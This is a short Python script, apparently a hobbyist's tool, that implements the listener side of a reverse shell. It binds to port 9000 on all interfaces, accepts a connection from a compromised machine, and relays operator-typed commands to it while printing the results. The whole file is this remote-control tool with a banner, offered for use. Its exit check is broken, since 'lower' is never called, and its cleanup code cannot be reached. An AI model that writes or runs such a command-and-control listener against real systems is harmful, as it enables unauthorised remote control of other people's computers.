#A simple reverse shell created by Akshay Ravi
#import elements for the connection
import os
import socket
import subprocess

os.system("clear")

subprocess.call('figlet "R-SHELL"' , shell = True)
print("-" * 41)
print("  Reverse Shell Created By Akshay Ravi")
print("-" * 41)
#sever host & port 
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 9000

#send 1024 (1kb) a time as buffer 
BUFFER_SIZE=1024
 
 #create a socket object
s=socket.socket()
 
 # bind the socket to all IP addresses of this host
s.bind((SERVER_HOST,SERVER_PORT))

 #listineng for the connection
s.listen(5)
print("")
print(f"[+]Listening on {SERVER_HOST}:{SERVER_PORT}")
 
 #Accept any connect attempted
client_socket , client_adress=s.accept()
print(f"[+]{client_adress[0]}:{client_adress[1]} Connected!")
 
 #sending a message
#message="Hello,Welcome".encode()
#client_socket.send(message)
 
 #Now let's start our main loop, which is sending shell commands and retrieving the results and printing them
 
while True:
 	# get the command from prompt
    command = input("Shell> ")
    #send the command to the clint
    client_socket.send(command.encode())
    #if the command is exit ,break the loop
    if command.lower == "exit":
    	break
    #retrive command result
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
    #close connection to the client
client_socket.close()
    #close server connectiom
s.close()    
